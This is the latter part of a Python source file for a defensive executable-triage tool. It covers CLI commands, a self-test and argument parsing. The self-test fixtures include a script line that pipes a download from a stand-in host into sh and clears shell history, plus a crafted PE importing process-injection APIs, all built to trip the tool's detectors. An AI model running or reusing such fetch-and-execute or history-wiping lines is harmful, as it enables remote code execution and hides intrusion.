    print(f"{'SHA-256':<66} {'LABEL':<20} PATH")
    line()
    for r in rows:
        print(f"{r['sha256']:<66} {(r['label'] or '-')[:19]:<20} {r['path'] or ''}")
    print(f"\n{len(rows)} reviewed file(s)")


def cmd_explain(_a):
    banner()
    print(textwrap.dedent("""\
        WHAT THIS TOOL IS
          A triage aid. It reads executables as data, parses their headers, measures
          entropy, pulls strings and checks filesystem context, then orders what it
          found by how much a human should look at it first.

        WHAT IT IS NOT
          It is not antivirus. There is no signature database, no sandbox and no
          reputation lookup, because those need network access and API keys. It will
          never tell you a file is malicious, and it cannot tell you a file is safe.
          A low score means "none of these checks noticed anything" - which is exactly
          what competent malware is built to achieve.

        WHY EVERY INDICATOR SAYS WHEN IT IS NORMAL
          On a healthy machine, most of these fire for ordinary reasons. High entropy
          is a compressed installer. A static binary is Go. RWX memory is a JIT. An
          unsigned executable is every in-house tool ever built. A detector that does
          not tell you this trains you to ignore it, and then you ignore the one that
          mattered. So each indicator states its innocent explanation next to its
          suspicious one, and you decide.

        THE INDICATORS THAT ARE HARD TO EXPLAIN INNOCENTLY
          - An executable whose filename claims to be a document. Nothing legitimate
            ships an ELF called invoice.pdf.
          - A binary named after a system tool sitting outside a system directory.
          - Bidirectional text control characters in a filename.
          - Strings for deleting shadow copies or disabling recovery.
          Those are worth your time. Almost everything else is context.

        WHAT TO DO WITH A HIGH SCORE
          1. Do not delete it. You destroy the evidence and may break the system.
          2. Note the SHA-256 this tool prints.
          3. Check that hash against a reputation service yourself. This tool uploads
             nothing - submitting a file can disclose confidential data, and during a
             targeted intrusion it tells the attacker you are looking.
          4. If it still looks wrong, isolate the host and follow your incident
             process. Preserve the file; do not clean it in place.

        ON SCANNING REAL SAMPLES
          Reading a file is safe - this tool never executes anything. But if you are
          handling live malware, do it on an isolated machine with proper containment,
          the same as with any other analysis tool.
        """))
    line()


def cmd_scans(a):
    rows = q("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (a.limit,))
    if not rows:
        print("No scans yet.")
        return
    print(f"{'ID':>4}  {'WHEN (UTC)':<20} {'FILES':>6} {'FLAG':>5} {'TOP':>6}  PATHS")
    line()
    for s in rows:
        print(f"{s['id']:>4}  {s['ts'][:19].replace('T', ' '):<20} {s['scanned']:>6} "
              f"{s['files_flagged']:>5} {s['top_score']:>6}  "
              f"{', '.join(json.loads(s['paths'] or '[]'))[:38]}")


def cmd_export(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("No scans to export yet.")
        return 1
    fmt = a.format.lower()
    body = {"json": export_json, "csv": export_csv, "html": export_html}[fmt](sid)
    out = a.out or f"suspex-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.{fmt}"
    with open(out, "w", encoding="utf-8") as fh:
        fh.write(body)
    log_event("INFO", "export", f"Exported scan #{sid} as {fmt.upper()} to {out}", sid)
    print(f"Wrote {out} ({len(body):,} bytes)")
    print("Scores in this file are a triage priority, not verdicts.")
    return 0


def cmd_logs(a):
    sql, args = "SELECT * FROM audit_log WHERE 1=1", []
    if a.level:
        sql += " AND level=?"
        args.append(a.level.upper())
    sql += " ORDER BY id DESC LIMIT ?"
    args.append(a.limit)
    rows = q(sql, tuple(args))
    if not rows:
        print("No log entries.")
        return
    for e in reversed(rows):
        print(f"{e['ts'][:19].replace('T', ' ')}  {e['level']:<5} {e['source']:<12} "
              f"{e['message']}")


def cmd_purge(a):
    conn = connect()
    try:
        if a.all:
            for t in ("indicators", "files", "scans", "audit_log"):
                conn.execute(f"DELETE FROM {t}")
            if a.baseline:
                conn.execute("DELETE FROM baseline")
            conn.commit()
            print("All scans, files, indicators and logs deleted."
                  + (" The reviewed-file list was cleared too." if a.baseline
                     else " The reviewed-file list was kept."))
            return
        rows = q("SELECT id FROM scans ORDER BY id DESC", (), conn)
        drop = [r["id"] for r in rows[a.keep:]]
        for sid in drop:
            conn.execute("DELETE FROM indicators WHERE scan_id=?", (sid,))
            conn.execute("DELETE FROM files WHERE scan_id=?", (sid,))
            conn.execute("DELETE FROM scans WHERE id=?", (sid,))
        conn.commit()
        log_event("INFO", "purge", f"Purged {len(drop)} scan(s), kept the newest {a.keep}",
                  None, conn)
        print(f"Purged {len(drop)} scan(s); kept the newest {a.keep}.")
    finally:
        conn.close()


def cmd_serve(a):
    serve(a.host, a.port, a.debug)


def cmd_version(_a):
    banner()
    print(f"  Python     : {platform.python_version()} ({sys.platform})")
    print(f"  Flask      : {'yes' if HAVE_FLASK else 'NOT INSTALLED - web app unavailable'}")
    print(f"  Formats    : ELF, PE/COFF, Mach-O, scripts")
    print(f"  Indicators : {len(PE_API_GROUPS)} API groups, {len(SUSPICIOUS_STRINGS)} string "
          f"patterns, {len(PACKER_SECTIONS)} packer signatures")
    print(f"  Database   : {os.path.abspath(db_path())}")
    print(f"  GitHub     : {GITHUB}")
    print(f"  LinkedIn   : {LINKEDIN}")
    line()
    print(DISCLAIMER_LONG)
    line()


# =============================================================================
# SECTION 10 - Self test
#   Parsers are checked against real system binaries and against fixtures built
#   here. The most important assertions are the FALSE POSITIVE ones: ordinary
#   system binaries must score at the bottom of the scale.
# =============================================================================

def _build_fixtures(root: str) -> dict:
    """Craft files that exercise each indicator. Nothing here is malicious - they
    are ordinary files shaped to trip specific checks, and none is ever run."""
    os.makedirs(root, exist_ok=True)
    made = {}
    donor = next((p for p in ("/bin/true", "/usr/bin/true", "/bin/echo", sys.executable)
                  if os.path.isfile(p)), None)
    if donor:
        with open(donor, "rb") as fh:
            elf = fh.read()
        made["clean_elf"] = os.path.join(root, "helper")
        with open(made["clean_elf"], "wb") as fh:
            fh.write(elf)
        os.chmod(made["clean_elf"], 0o755)
        made["masquerade"] = os.path.join(root, "ps")
        with open(made["masquerade"], "wb") as fh:
            fh.write(elf)
        os.chmod(made["masquerade"], 0o755)
        made["extension_mismatch"] = os.path.join(root, "invoice.pdf")
        with open(made["extension_mismatch"], "wb") as fh:
            fh.write(elf)
        os.chmod(made["extension_mismatch"], 0o755)
    made["script"] = os.path.join(root, "setup.sh")
    with open(made["script"], "w") as fh:
        fh.write("#!/bin/sh\ncurl http://example.invalid/stage2 | sh\nhistory -c\n"
                 "echo 203.0.113.7 198.51.100.4 192.0.2.9 203.0.113.8 198.51.100.5\n")
    os.chmod(made["script"], 0o755)
    made["opaque"] = os.path.join(root, "blob.dat")
    with open(made["opaque"], "wb") as fh:
        fh.write(os.urandom(120_000))
    os.chmod(made["opaque"], 0o755)
    made["world_writable"] = os.path.join(root, "shared-tool")
    with open(made["world_writable"], "w") as fh:
        fh.write("#!/bin/sh\necho hello\n")
    os.chmod(made["world_writable"], 0o777)
    made["plain"] = os.path.join(root, "notes.txt")
    with open(made["plain"], "w") as fh:
        fh.write("just a text file, nothing to see\n" * 40)

    # a structurally valid PE32+ carrying packer sections and injection imports
    def build_pe():
        secs = [(b".text\0\0\0", 0x1000, 0x1000, 0x400, 0x400, 0x60000020),
                (b"UPX1\0\0\0\0", 0x2000, 0x2000, 0x200, 0x800, 0xE0000020)]
        opt = struct.pack("<HBBIIIII", 0x20b, 14, 0, 0x400, 0, 0, 0x1000, 0x1000)
        opt += struct.pack("<Q", 0x140000000) + struct.pack("<II", 0x1000, 0x200)
        opt += struct.pack("<HHHHHH", 6, 0, 0, 0, 6, 0)
        opt += struct.pack("<III", 0, 0x4000, 0xA00)
        opt += struct.pack("<IHH", 0, 3, 0x0000)
        opt += struct.pack("<QQQQ", 0x100000, 0x1000, 0x100000, 0x1000)
        opt += struct.pack("<II", 0, 16)
        dirs = [(0, 0)] * 16
        dirs[1] = (0x1100, 40)                      # import directory
        opt += b"".join(struct.pack("<II", a, b) for a, b in dirs)
        coff = struct.pack("<HHIIIHH", 0x8664, len(secs), 0x60000000, 0, 0, len(opt), 0x22)
        hdr = b"MZ" + b"\x00" * 0x3a + struct.pack("<I", 0x40) + b"PE\0\0" + coff + opt
        for n, vs, va, rs, rp, ch in secs:
            hdr += n + struct.pack("<IIII", vs, va, rs, rp)
            hdr += struct.pack("<IIHHI", 0, 0, 0, 0, ch)
        img = bytearray(hdr.ljust(0x400, b"\0"))
        # .text raw data at 0x400 covers RVA 0x1000..0x2000
        text = bytearray(b"\x90" * 0x400)

        def put(off_in_sec, blob):
            text[off_in_sec:off_in_sec + len(blob)] = blob

        # import descriptor at RVA 0x1100 -> section offset 0x100
        put(0x100, struct.pack("<IIIII", 0x1200, 0, 0, 0x1180, 0x1200) +
            struct.pack("<IIIII", 0, 0, 0, 0, 0))
        put(0x180, b"KERNEL32.dll\0")
        thunks = b""
        names_off = 0x260
        for i, api in enumerate((b"VirtualAllocEx", b"WriteProcessMemory",
                                 b"CreateRemoteThread", b"IsDebuggerPresent",
                                 b"CheckRemoteDebuggerPresent")):
            rva = 0x1000 + names_off
            put(names_off, struct.pack("<H", 0) + api + b"\0")
            names_off += 2 + len(api) + 1
            thunks += struct.pack("<Q", rva)
        thunks += struct.pack("<Q", 0)
        put(0x200, thunks)
        img += text
        img += b"\x00" * 0x200
        return bytes(img)

    made["pe"] = os.path.join(root, "sample.exe")
    with open(made["pe"], "wb") as fh:
        fh.write(build_pe())
    return made


def cmd_selftest(_a=None) -> int:
    import tempfile
    passed, failed = [], []

    def check(name, cond, detail=""):
        (passed if cond else failed).append(name)
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}"
              f"{'  <- ' + str(detail) if detail and not cond else ''}")

    banner()
    print("SELF TEST - parsers against real binaries, indicators against fixtures.\n")
    original = db_path()
    tmp = tempfile.mkdtemp(prefix="suspex-selftest-")
    set_db_path(os.path.join(tmp, "selftest.db"))
    fx_root = os.path.join(tmp, "fixtures")
    try:
        print(" Unit checks")
        check("entropy of random data is near 8", entropy(os.urandom(65536)) > 7.9)
        check("entropy of repeated data is near 0", entropy(b"A" * 8192) < 0.1)
        check("entropy of empty data is 0", entropy(b"") == 0.0)
        check("byte formatting", fmt_bytes(1024) == "1.0 KiB" and fmt_bytes(None) == "-")
        check("html escaping blocks tag injection",
              "<script>" not in html_escape("<script>alert(1)</script>"))
        check("priority bands map scores to labels",
              priority_of(0)[0] == "nothing stood out" and priority_of(70)[0] == "urgent review"
              and priority_of(20)[0] == "worth a look")
        check("printable strings finds ASCII and UTF-16",
              b"HelloThere" in printable_strings(b"\x00\x01HelloThere\x00")
              and b"WideText" in printable_strings("WideText".encode("utf-16-le")))

        print("\n Format detection")
        check("ELF magic detected", detect_format(b"\x7fELF\x02\x01\x01\x00") == "ELF")
        check("PE magic detected", detect_format(b"MZ\x90\x00" + b"\x00" * 60) == "PE")
        check("Mach-O magic detected", detect_format(b"\xcf\xfa\xed\xfe" * 2) == "Mach-O")
        check("shebang detected as script", detect_format(b"#!/bin/sh\necho") == "script")
        check("zip/gzip detected as archive",
              detect_format(b"PK\x03\x04....") == "archive"
              and detect_format(b"\x1f\x8b\x08\x00") == "archive")
        check("plain text is data, not an executable",
              detect_format(b"hello world, this is text") == "data")

        print("\n ELF parsing (real system binaries)")
        donor = next((p for p in ("/bin/ls", "/bin/cat", "/usr/bin/env", sys.executable)
                      if os.path.isfile(p)), None)
        check("a real ELF binary is available to test against", donor is not None)
        if donor:
            with open(donor, "rb") as fh:
                raw = fh.read()
            e = parse_elf(raw)
            check("real ELF parses without errors", e["ok"] and not e["errors"], e["errors"])
            check("ELF class and machine are read",
                  e["bits"] in (32, 64) and e["machine"])
            check("sections and segments are enumerated",
                  len(e["sections"]) > 5 and len(e["segments"]) > 3)
            check("the dynamic loader is identified",
                  e["interp"] is None or "ld-" in (e["interp"] or ""))
            check("linked libraries are extracted",
                  e["static"] or any(n.startswith("lib") for n in e["needed"]),
                  e["needed"][:4])
            check("hardening flags are read (NX/RELRO/PIE)",
                  e["nx"] is not None and e["relro"] is not None and e["pie"] is not None)
            check("no section is reported as writable AND executable",
                  not any(s["perm"] == "wx" for s in e["sections"]))
            check("a truncated ELF is reported, not guessed",
                  parse_elf(raw[:20])["ok"] is False)
            check("a non-ELF buffer is rejected", parse_elf(b"not an elf at all")["ok"] is False)

        print("\n PE parsing (fixture)")
        fx = _build_fixtures(fx_root)
        with open(fx["pe"], "rb") as fh:
            pe_raw = fh.read()
        pe = parse_pe(pe_raw)
        check("fixture PE parses", pe["ok"], pe["errors"])
        check("PE machine and subsystem are read",
              pe.get("machine") == "x86-64" and "console" in (pe.get("subsystem") or ""))
        check("PE sections are enumerated with permissions",
              len(pe["sections"]) == 2 and any(s["perm"] == "rwx" for s in pe["sections"]))
        check("a packer section name is present", any(s["name"] == "UPX1"
                                                      for s in pe["sections"]))
        check("imports are resolved from the import table",
              "KERNEL32.dll" in pe["imports"], list(pe["imports"]))
        check("injection APIs are among the imports",
              {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"}
              <= set(pe["imports"].get("KERNEL32.dll", [])),
              pe["imports"].get("KERNEL32.dll"))
        check("a file with MZ but no PE signature is reported honestly",
              parse_pe(b"MZ" + b"\x00" * 0x3c + struct.pack("<I", 0x40) + b"XXXX")["ok"]
              is False)
        check("a non-PE buffer is rejected", parse_pe(b"\x7fELF")["ok"] is False)
        check("Mach-O header parses", parse_macho(b"\xcf\xfa\xed\xfe" + b"\x00" * 24)["ok"])
        check("a fat/universal Mach-O is recognised",
              parse_macho(b"\xca\xfe\xba\xbe" + b"\x00" * 8)["universal"])

        print("\n Content analysis")
        s = analyse_strings(b"visit https://example.test/a and 203.0.113.9 "
                            b"curl http://x.test/y | sh")
        check("URLs are extracted", any("example.test" in u for u in s["urls"]))
        check("IP addresses are extracted", "203.0.113.9" in s["ips"])
        check("loopback addresses are ignored as noise",
              "127.0.0.1" not in analyse_strings(b"127.0.0.1 is local")["ips"])
        check("pipe-to-shell is matched",
              any("pipe-to-shell" in h["label"] for h in s["hits"]))
        check("every string pattern carries a benign explanation",
              all(h["benign"] for h in s["hits"]))
        emb = find_embedded_executables(b"HEADER" + b"\x7fELF" + b"\x00" * 40)
        check("an embedded ELF header is located", emb and emb[0]["offset"] == 6)
        check("an executable at offset 0 is not called embedded",
              not find_embedded_executables(b"\x7fELF" + b"\x00" * 40))

        print("\n FALSE POSITIVES - the check that matters most")
        system_bins = [p for p in ("/bin/ls", "/bin/cat", "/bin/bash", "/usr/bin/env",
                                   "/usr/bin/python3", sys.executable) if os.path.isfile(p)]
        scores = {}
        for p in system_bins:
            scores[p] = inspect_file(p)["score"]
        check(f"ordinary system binaries score at the bottom of the scale "
              f"(max {max(scores.values()) if scores else 0})",
              all(v <= 5 for v in scores.values()), scores)
        check("no system binary is ever flagged for review",
              all(v < 15 for v in scores.values()), scores)
        clean_text = inspect_file(fx["plain"])
        check("a plain text file raises nothing",
              clean_text["score"] == 0 and clean_text["format"] == "data",
              clean_text["score"])
        if "clean_elf" in fx:
            copied = inspect_file(fx["clean_elf"])
            check("an unremarkable copied binary stays below the review threshold",
                  copied["score"] < 15,
                  [i.code for i in copied["indicators"] if i.severity != "info"])

        print("\n Indicators (fixtures)")
        def codes(path):
            return {i.code for i in inspect_file(path)["indicators"]}

        if "extension_mismatch" in fx:
            r = inspect_file(fx["extension_mismatch"])
            check("an ELF named .pdf is flagged as an extension mismatch",
                  "name.extension-mismatch" in {i.code for i in r["indicators"]})
            check("that indicator is critical and outranks everything else",
                  r["score"] >= 30 and any(i.severity == "critical" for i in r["indicators"]))
        if "masquerade" in fx:
            check("a binary named after a system tool outside a system path is flagged",
                  "name.masquerade" in codes(fx["masquerade"]))
        c = codes(fx["script"])
        check("pipe-to-shell in a script is flagged", any(x.startswith("str.") for x in c))
        check("shell history tampering is flagged",
              any("history" in x for x in c), c)
        check("many hard-coded IP addresses are noted", "net.many-ips" in c, c)
        check("an executable, unrecognised, incompressible file is flagged",
              "content.opaque-executable" in codes(fx["opaque"]))
        check("a world-writable executable is flagged",
              "fs.world-writable" in codes(fx["world_writable"]))
        pe_res = inspect_file(fx["pe"])
        pc = {i.code for i in pe_res["indicators"]}
        check("PE packer section is flagged", "pe.packer-section" in pc, pc)
        check("PE writable+executable section is flagged", "pe.rwx-section" in pc, pc)
        check("PE injection imports are flagged", "pe.api.process-injection" in pc, pc)
        check("PE anti-analysis imports are flagged", "pe.api.anti-analysis" in pc, pc)
        check("an unsigned PE is noted only as low severity",
              any(i.code == "pe.unsigned" and i.severity == "low"
                  for i in pe_res["indicators"]))
        check("every indicator raised carries a 'when this is normal' note",
              all(i.benign for i in pe_res["indicators"] if i.severity != "info"),
              [i.code for i in pe_res["indicators"] if not i.benign])
        check("the fixture PE outranks a clean binary",
              pe_res["score"] > (scores.get(system_bins[0], 0) if system_bins else 0))

        print("\n Scanning and persistence")
        init_db()
        sid = run_scan([fx_root], note="selftest")
        sc = scan_summary(sid)
        check("scan stored and files recorded",
              sc and sc["scanned"] >= 6 and q1("SELECT COUNT(*) c FROM files WHERE scan_id=?",
                                               (sid,))["c"] == sc["scanned"])
        check("indicators persisted and linked to files",
              q1("SELECT COUNT(*) c FROM indicators WHERE scan_id=?", (sid,))["c"] > 0
              and q1("SELECT COUNT(*) c FROM indicators i LEFT JOIN files f ON f.id=i.file_id "
                     "WHERE f.id IS NULL", ())["c"] == 0)
        top3 = [os.path.basename(r["path"]) for r in
                q("SELECT path FROM files WHERE scan_id=? ORDER BY score DESC LIMIT 3",
                  (sid,))]
        # not asserted to be first: the PE fixture stacks three independent strong
        # signals (RWX memory, injection imports, packer section) and legitimately
        # outranks a single critical indicator
        check("the disguised executable ranks among the top findings",
              "invoice.pdf" in top3, top3)
        check("the crafted PE also ranks among the top findings",
              "sample.exe" in top3, top3)
        check("the unremarkable copied binary does not",
              "helper" not in top3 and "notes.txt" not in top3, top3)
        check("every file above the review threshold is one of the crafted fixtures",
              all(os.path.dirname(r["path"]) == fx_root for r in
                  q("SELECT path FROM files WHERE scan_id=? AND score>=15", (sid,))))
        check("a missing path is recorded rather than ignored",
              json.loads(scan_summary(run_scan([os.path.join(tmp, "nope")]))["missing"])
              == [os.path.join(tmp, "nope")])
        check("scanning a single file works",
              scan_summary(run_scan([fx["pe"]]))["scanned"] == 1)
        quick_id = run_scan([fx_root], quick=True)
        check("quick mode records that content checks were skipped",
              q1("SELECT COUNT(*) c FROM indicators WHERE scan_id=? AND code='scan.quick'",
                 (quick_id,))["c"] > 0)

        print("\n Reviewed-file baseline")
        target = q1("SELECT sha256, path FROM files WHERE scan_id=? AND score>0 "
                    "ORDER BY score DESC LIMIT 1", (sid,))
        approve_hash(target["sha256"], path=target["path"], label="fixture")
        check("a hash can be marked as reviewed", target["sha256"] in load_baseline())
        after = run_scan([fx_root])
        row = q1("SELECT score, approved FROM files WHERE scan_id=? AND sha256=?",
                 (after, target["sha256"]))
        check("a reviewed file scores 0 on the next scan",
              row and row["approved"] == 1 and row["score"] == 0.0, dict(row) if row else None)
        check("other files are still scored normally",
              q1("SELECT COUNT(*) c FROM files WHERE scan_id=? AND score>0",
                 (after,))["c"] > 0)
        check("a reviewed hash can be revoked",
              revoke_hash(target["sha256"]) == 1
              and target["sha256"] not in load_baseline())

        print("\n Charts")
        check("pie renders slices", svg_pie([("a", 2, "#fff"), ("b", 1, "#000")]
                                            ).count("<path") == 2)
        check("pie with no data says so", "nothing to show" in svg_pie([]))
        check("bar renders rows", svg_bar([("x", 2), ("y", 1)]).count("<rect") == 4)
        check("scatter plots one dot per file",
              svg_scatter([{"name": "a", "entropy": 7.9, "score": 40},
                           {"name": "b", "entropy": 6.0, "score": 0}]).count("<circle") == 2)
        check("scatter with no data says so", "nothing to show" in svg_scatter([]))
        check("gauge renders", "<circle" in svg_gauge(40, ""))

        print("\n Exports")
        j = json.loads(export_json(sid))
        check("JSON export is valid and carries the disclaimer",
              "AUTHORISED" in j["disclaimer"].upper() and j["scan"]["id"] == sid)
        check("JSON export states plainly that it is not antivirus",
              "NOT antivirus" in j["not_antivirus"])
        check("JSON export tells the reader not to delete anything",
              "not delete" in j["next_steps"].lower())
        check("JSON export nests indicators inside each file",
              any(f["indicators"] for f in j["files"]))
        c = export_csv(sid)
        rows = [r for r in csv.reader(io.StringIO(c)) if r and not r[0].startswith("#")]
        check("CSV export has a header plus one row per file",
              rows[0][0] == "score" and len(rows) == sc["scanned"] + 1)
        h = export_html(sid)
        check("HTML export is a complete document",
              h.startswith("<!doctype html") and h.rstrip().endswith("</html>"))
        check("HTML export contains charts, disclaimer and author",
              "<svg" in h and "AUTHORISED USE ONLY" in h and AUTHOR in h)
        check("HTML export repeats the do-not-delete warning",
              "not delete" in h.lower())
        check("HTML export shows the benign explanation next to each indicator",
              "When this is normal" in h)

        print("\n Web application")
        if not HAVE_FLASK:
            check("Flask installed", False, "pip install flask")
        else:
            app = build_app()
            app.config["TESTING"] = True
            cl = app.test_client()
            for path, must in (("/", "Overview"), ("/files", "Files"),
                               ("/indicators", "Indicators"), ("/analytics", "Analytics"),
                               ("/logs", "Logs")):
                r = cl.get(path)
                body = r.get_data(as_text=True)
                check(f"page {path} returns 200 and renders",
                      r.status_code == 200 and must in body, f"status={r.status_code}")
                check(f"page {path} shows the disclaimer", "Authorised use only" in body)
            check("the overview warns against deleting anything",
                  "do not delete it" in cl.get("/").get_data(as_text=True).lower())
            check("the indicators page shows when each indicator is normal",
                  "When this is normal" in cl.get("/indicators").get_data(as_text=True))
            check("file filters apply",
                  cl.get("/files?format=ELF").status_code == 200
                  and cl.get("/files?min=15&qq=invoice&reviewed=1").status_code == 200)
            check("indicator filters apply",
                  cl.get("/indicators?severity=critical&qq=name").status_code == 200)
            check("analytics renders SVG charts",
                  cl.get("/analytics").get_data(as_text=True).count("<svg") >= 5)
            check("logs filters apply",
                  cl.get("/logs?level=INFO&limit=50&qq=scan").status_code == 200)
            digest = q1("SELECT sha256 FROM files WHERE scan_id=? AND score>0 LIMIT 1",
                        (sid,))["sha256"]
            r = cl.post("/approve", data={"sha256": digest, "scan": str(sid)})
            check("marking a file reviewed from the web works",
                  r.status_code == 302 and digest in load_baseline())
            revoke_hash(digest)
            n_before = q1("SELECT COUNT(*) c FROM scans", ())["c"]
            r = cl.post("/scan", data={"paths": fx_root, "quick": "1"})
            check("scanning from the web works",
                  r.status_code == 302
                  and q1("SELECT COUNT(*) c FROM scans", ())["c"] == n_before + 1)
            for fmt, ctype in (("json", "application/json"), ("csv", "text/csv"),
                               ("html", "text/html")):
                r = cl.get(f"/export/{fmt}?scan={sid}")
                check(f"export /{fmt} downloads",
                      r.status_code == 200 and ctype in r.headers["Content-Type"]
                      and "attachment" in r.headers.get("Content-Disposition", ""))
            check("bad export format is rejected", cl.get("/export/exe").status_code == 400)
            check("unknown route returns a helpful 404", cl.get("/nope").status_code == 404)
            check("api summary flags that scores are not verdicts",
                  cl.get("/api/summary").get_json()
                  ["scores_are_triage_priority_not_verdicts"] is True)
            check("empty-state page renders with no scans",
                  "No scans yet" in _empty_state_probe())

        print("\n Retention")
        cmd_purge(argparse.Namespace(all=False, keep=1, baseline=False))
        check("purge keeps exactly the newest scan",
              q1("SELECT COUNT(*) c FROM scans", ())["c"] == 1)
        check("purge removes orphaned files and indicators",
              q1("SELECT COUNT(*) c FROM files WHERE scan_id NOT IN "
                 "(SELECT id FROM scans)", ())["c"] == 0
              and q1("SELECT COUNT(*) c FROM indicators WHERE scan_id NOT IN "
                     "(SELECT id FROM scans)", ())["c"] == 0)
        approve_hash("deadbeef" * 8, label="survives")
        cmd_purge(argparse.Namespace(all=True, keep=1, baseline=False))
        check("purge --all clears the scans", q1("SELECT COUNT(*) c FROM scans", ())["c"] == 0)
        check("the reviewed-file list survives unless explicitly cleared", bool(load_baseline()))
        cmd_purge(argparse.Namespace(all=True, keep=1, baseline=True))
        check("purge --all --baseline clears it too", not load_baseline())
    finally:
        set_db_path(original)
        shutil.rmtree(tmp, ignore_errors=True)

    line("=")
    print(f"  {len(passed)} passed, {len(failed)} failed")
    if failed:
        print("  Failed: " + ", ".join(failed))
    else:
        print("  All checks passed. The temporary database and fixtures have been removed;\n"
              "  nothing was executed at any point and your own data was never touched.")
    line("=")
    return 0 if not failed else 1


def _empty_state_probe() -> str:
    import tempfile
    original = db_path()
    d = tempfile.mkdtemp(prefix="suspex-empty-")
    try:
        set_db_path(os.path.join(d, "empty.db"))
        init_db()
        app = build_app()
        app.config["TESTING"] = True
        return app.test_client().get("/").get_data(as_text=True)
    finally:
        set_db_path(original)
        shutil.rmtree(d, ignore_errors=True)


# =============================================================================
# SECTION 11 - Entry point
# =============================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{APP_NAME} v{VERSION} - static triage of executables, by {AUTHOR}",
        epilog=textwrap.dedent(f"""\
            examples
              %(prog)s explain                  what this is, and what it cannot tell you
              %(prog)s scan --path /tmp /opt    triage a directory
              %(prog)s inspect /path/to/file    one file in full detail
              %(prog)s files --min-score 35
              %(prog)s approve --file /usr/local/bin/known-good
              %(prog)s serve                    web app on http://127.0.0.1:5000
              %(prog)s selftest                 verify every component end to end

            THIS IS NOT ANTIVIRUS. Scores are a triage priority, never a verdict.
            Never delete a file on the strength of this report.

            {DISCLAIMER_LONG}
            """))
    p.add_argument("--db", default=DEFAULT_DB,
                   help=f"SQLite database file (default: {DEFAULT_DB}, env SUSPEX_DB)")
    p.add_argument("--version", action="version", version=f"{APP_NAME} {VERSION} by {AUTHOR}")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("scan", help="triage the executables under one or more paths")
    s.add_argument("--path", nargs="+", help=f"paths to scan (default: "
                                             f"{' '.join(DEFAULT_SCAN_PATHS)})")
    s.add_argument("--quick", action="store_true",
                   help="skip string extraction and embedded-executable detection")
    s.add_argument("--all-files", action="store_true",
                   help="examine every file, not just executables")
    s.add_argument("--no-recurse", action="store_true")
    s.add_argument("--max-files", type=int, default=3000)
    s.add_argument("--min-score", type=float, default=15.0,
                   help="only print files at or above this score")
    s.add_argument("--show", type=int, default=10)
    s.add_argument("--quiet", action="store_true")
    s.add_argument("--note")
    s.set_defaults(func=cmd_scan)

    s = sub.add_parser("inspect", help="full detail on a single file (not stored)")
    s.add_argument("path")
    s.add_argument("--quick", action="store_true")
    s.set_defaults(func=cmd_inspect)

    s = sub.add_parser("show", help="summary of one scan")
    s.add_argument("scan", nargs="?", type=int)
    s.add_argument("--limit", type=int, default=10)
    s.add_argument("--min-score", type=float, default=15.0)
    s.set_defaults(func=cmd_show)

    s = sub.add_parser("files", help="files from a scan")
    s.add_argument("--scan", type=int)
    s.add_argument("--format")
    s.add_argument("--search")
    s.add_argument("--min-score", type=float, default=0.0)
    s.add_argument("--reviewed", action="store_true", help="include files already reviewed")
    s.add_argument("--limit", type=int, default=100)
    s.set_defaults(func=cmd_files)

    s = sub.add_parser("indicators", help="indicators raised, grouped by type")
    s.add_argument("--scan", type=int)
    s.add_argument("--severity", choices=SEVERITIES)
    s.set_defaults(func=cmd_indicators)

    s = sub.add_parser("approve", help="record a file as reviewed and expected, by hash")
    s.add_argument("--file")
    s.add_argument("--sha256")
    s.add_argument("--label")
    s.add_argument("--note")
    s.set_defaults(func=cmd_approve)

    s = sub.add_parser("revoke", help="remove a hash from the reviewed list")
    s.add_argument("sha256")
    s.set_defaults(func=cmd_revoke)

    s = sub.add_parser("baseline", help="list reviewed files")
    s.add_argument("--limit", type=int, default=50)
    s.set_defaults(func=cmd_baseline)

    s = sub.add_parser("scans", help="list previous scans")
    s.add_argument("--limit", type=int, default=25)
    s.set_defaults(func=cmd_scans)

    s = sub.add_parser("explain", help="what this tool is, and what it cannot tell you")
    s.set_defaults(func=cmd_explain)

    s = sub.add_parser("serve", help="start the web app (5 pages)")
    s.add_argument("--host", default="127.0.0.1")
    s.add_argument("--port", type=int, default=5000)
    s.add_argument("--debug", action="store_true")
    s.set_defaults(func=cmd_serve)

    s = sub.add_parser("export", help="write a report to a file")
    s.add_argument("--scan", type=int)
    s.add_argument("--format", choices=["json", "csv", "html"], default="html")
    s.add_argument("--out")
    s.set_defaults(func=cmd_export)

    s = sub.add_parser("logs", help="local event log")
    s.add_argument("--level", choices=["INFO", "WARN", "ERROR", "info", "warn", "error"])
    s.add_argument("--limit", type=int, default=50)
    s.set_defaults(func=cmd_logs)

    s = sub.add_parser("purge", help="delete stored scans")
    s.add_argument("--keep", type=int, default=10)
    s.add_argument("--all", action="store_true")
    s.add_argument("--baseline", action="store_true",
                   help="with --all, also clear the reviewed-file list")
    s.set_defaults(func=cmd_purge)

    s = sub.add_parser("selftest", help="verify every component (temporary database)")
    s.set_defaults(func=cmd_selftest)

    s = sub.add_parser("version", help="versions, dependencies and the disclaimer")
    s.set_defaults(func=cmd_version)
    return p


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    set_db_path(args.db)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    if args.cmd != "selftest":
        init_db()
    try:
        rc = args.func(args)
        return rc if isinstance(rc, int) else 0
    except BrokenPipeError:
        try:
            os.dup2(os.open(os.devnull, os.O_WRONLY), sys.stdout.fileno())
        except Exception:
            pass
        return 0
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130
    except PermissionError as e:
        print(f"Permission denied: {e}\nSome paths need root to read.")
        return 1
    except sqlite3.OperationalError as e:
        print(f"Database error: {e}\nIs another copy running against {db_path()}?")
        return 1


if __name__ == "__main__":
    sys.exit(main())
